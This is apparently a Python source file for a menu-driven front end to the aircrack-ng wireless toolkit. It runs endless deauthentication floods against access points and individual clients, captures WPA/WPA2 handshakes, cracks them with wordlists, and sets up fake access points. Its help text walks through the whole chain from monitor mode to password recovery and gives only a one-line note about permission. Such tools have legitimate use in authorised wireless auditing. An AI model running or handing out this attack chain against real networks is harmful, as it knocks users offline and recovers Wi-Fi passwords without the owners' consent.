# Copyright (c) 2025 Nico
# This code is licensed under the MIT License – see LICENSE file for details.

from time import sleep
from colorama import Fore
import os
import subprocess

purple = "\033[38;5;129m"
restart = True 
interface = None

if not os.path.exists("output"):
    os.makedirs("output")

def main_menu():
    input("Press key for menu: ")

def clear():
    os.system("clear")

def airmon_ng():
    subprocess.run(["sudo", "airmon-ng"])

def banner():
    clear()
    print(purple + """.##...##...####...##..##...####...######..######.
.###.###..##..##..###.##..##..##..##........##...
.##.#.##..##..##..##.###..##..##..####......##...
.##...##..##..##..##..##..##..##..##........##...
.##...##...####...##..##...####...##......######.
.................................................""")
    print("")
        
def airmonng():
    print(Fore.MAGENTA + "Airmon-ng")
    print(purple + "[1] Start Monitor Mode")
    print("[2] Stop Monitor Mode")
    print("[3] Shows disturbing processes")
    print("[4] Kill disturbing processes")
    print("[5] Start Monitor on specific channel")
    print("")
def interfaces():
    print(Fore.MAGENTA + "interface")
    print(purple + "[6] Select interface")
    print("")
def airodumpng():
    print(Fore.MAGENTA + "airodump-ng")
    print(purple + "[7] Show all networks")
    print("[8] Targeted monitoring")
    print("")

def aireplayng():
    print(Fore.MAGENTA + "aireplay-ng")
    print(purple + "[9] Endless Deauth ")
    print("[10] Deauthentication attack (optional)")
    print("[11] Targeted against specific client")
    print("")

def airecrackng():
    print(Fore.MAGENTA + "airecrack-ng")
    print(purple + "[12] Crack WPA/WPA2 with Wordlist")
    print("")

def airbaseng():
    print(Fore.MAGENTA + "airbase-ng")
    print(purple + "[13] Set up a fake access point")
    print("")

def airgraphng():
    print(Fore.MAGENTA + "airgraph-ng")
    print(purple + "[14] Visualize network connections")
    print("")

def wash():
    print(Fore.MAGENTA + "wash")
    print(purple + "[15] Displays WPS capable networks") 
    print("")
def helper():
    print(purple + """This program is built entirely around the tools provided by airmon-ng, so please make sure to support its developers. Before you begin, it’s important to understand that most functions in this program can be stopped at any time by pressing Ctrl + C. To get started, you’ll first need to place your wireless interface into monitor mode. This is done using airmon-ng, which is shown at the beginning of the program. Simply follow the on-screen instructions to enable monitor mode on your interface. Once activated, your interface will typically be renamed to something like wlan0mon or wlan1mon.

Next, press 6 in the menu and select the interface you just switched into monitor mode. This interface will now be used to scan nearby wireless networks if you press 7. Please remember: only attempt to test or attack networks you own or have explicit permission to audit. During the scan, make note of the MAC address and the channel (usually a number between 1 and 13) of the target network. Once you have that information, proceed to step 8 in the program to start monitoring the network. Let the monitoring process run for a while so the necessary handshake data can be captured.

After that, return to the main menu and choose the "endless deauth" option. Follow the instructions provided by the program carefully. When enough data has been collected, you can check the .cap file (typically located in something like output/output.cap) to see if EAPOL packets have been successfully captured. If no EAPOLs are present, password cracking will not be possible. If they are, proceed to run aircrack-ng. Navigate to the .cap file and select it, then provide your own password list (for example: psw/password-list.txt). If the correct password is in the list, the brute-force process will succeed and reveal it.

Good luck—and if you have any further questions, feel free to reach out!""")

def start_interface_1():
    clear()
    subprocess.run(["sudo", "airmon-ng"])
    interface_start = input("Enter interface for monitor mode: ")
    subprocess.run(["sudo", "airmon-ng", "start", interface_start])
    sleep(1)

def stop_interface_2():
    clear()
    airmon_ng()
    interface_stop = input("Enter interface to stop: ")
    subprocess.run(["sudo", "airmon-ng", "stop", interface_stop])
    sleep(0)

def show_disturbing_proc_3():
    clear()
    subprocess.run(["sudo", "airmon-ng", "check"])
    main_menu()

def kill_disturbing_proc_4():
    clear()
    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    sleep(3)

def start_interface_channel_5():
    clear()
    airmon_ng()
    interface_start_channel = input("Enter interface: ")
    channel_airmon = input("Enter channel: ")
    subprocess.run(["sudo", "airmon-ng", "start", interface_start_channel, channel_airmon])

def show_networks_7():
    clear()
    if interface:
        subprocess.run(["sudo", "airodump-ng", interface])
    else:
        print("Please enter an interface first in option 6!")
         
    sleep(2)
    main_menu()

def targeted_monitoring_8():
    clear()
    monitoring_mac = input("Enter MAC: ")
    monitoring_channel = input("Enter channel: ")
    monitoring_output_name = input("Enter output file name: ")
    subprocess.run(["sudo", "airodump-ng","-c", monitoring_channel,"-w", f"output/{monitoring_output_name}","--bssid", monitoring_mac,interface])

def endless_deauth_9():
    clear()
    endlessdeauth_mac = input("Enter MAC: ")
    subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", endlessdeauth_mac, interface])

def deauth_attack_10():
    clear()
    deauthattack_packages = input("Enter how many packages: ")
    deauthattack_mac = input("Enter MAC: ")
    subprocess.run(["sudo", "aireplay-ng", "--deauth", deauthattack_packages, "-a", deauthattack_mac, interface])

def target_against_client_11():
    clear()
    deauthspecific_mac = input("Enter MAC: ")
    deauthspecific_client = input("Enter client MAC: ")
    subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", deauthspecific_mac, "-c", deauthspecific_client, interface])

def crack_wpa2_12():
    clear()
    subprocess.run(["ls", "output"])
    aircrack_output = input("Enter the output Name: ")
    subprocess.run(["ls", "psw"])
    aircrack_list = input("Enter the password list: ")
    clear()
    subprocess.run(["sudo", "aircrack-ng", f"output/{aircrack_output}", "-w", f"psw/{aircrack_list}"])
    main_menu()

def fake_access_point_13():
    clear()
    airbase_name = input("Enter Wifi name: ")
    airbase_channel = input("Enter channel 1-11: ")
    subprocess.run(["sudo", "airbase-ng", "-e ",airbase_name, "-c", airbase_channel, interface])
    main_menu()

def visualize_network_14():
    clear()
    subprocess.run(["ls", "output"])
    airgraph_csv = input("Enter .csv file: ")
    airgrap_outputname = input("Enter output name: ")
    subprocess.run(["sudo", "airgraph-ng", "-i", f"output/{airgraph_csv}", "-o", f"output/{airgrap_outputname}", "-g", "CAPR"])
    main_menu()

def displays_wpa_capable_15():
    clear()
    subprocess.run(["sudo", "wash", "-i", interface])
    main_menu()

def reset_output_folder():
    subprocess.run(["rm", "-rf", "output"])
    subprocess.run(["mkdir", "output"])

while restart == True:
        try:
            banner()
            if interface:
                print(Fore.GREEN + f"interface is {interface}")
            else: print(Fore.RED + "No interface is selected")
            airmonng()
            interfaces()
            airodumpng()
            aireplayng()
            airecrackng()
            airbaseng()
            airgraphng()
            wash()
            print(Fore.MAGENTA + "[16] Delete files in output")
            print(Fore.MAGENTA + "[17] help")
            print(Fore.MAGENTA + "[18] exit")
            mode = int(input(": "))
            if mode == 1:
                start_interface_1()
            elif mode == 2:
                stop_interface_2()
            elif mode == 3:
                show_disturbing_proc_3()
            elif mode == 4:
                kill_disturbing_proc_4()
            elif mode == 5:
                start_interface_channel_5()
            elif mode == 6:
                clear()
                airmon_ng()
                print("you can change that everytime!")
                interface = input("Enter the interface for airodump/aireplay/aircrack etc. (like wlan0mon): ")
            elif mode == 7:
                show_networks_7()
            elif mode == 8:
                targeted_monitoring_8()
            elif mode == 9:
                endless_deauth_9()
            elif mode == 10:
                deauth_attack_10()
            elif mode == 11:
                target_against_client_11()
            elif mode == 12:
                crack_wpa2_12()
            elif mode == 13:
                fake_access_point_13()
            elif mode == 14:
                visualize_network_14()
                main_menu()
            elif mode == 15:
                displays_wpa_capable_15()
            elif mode == 16:
                reset_output_folder()
            elif mode == 17:
                clear()
                helper()
                main_menu()
            elif mode == 18:
                clear()
                break
        except: KeyboardInterrupt and ValueError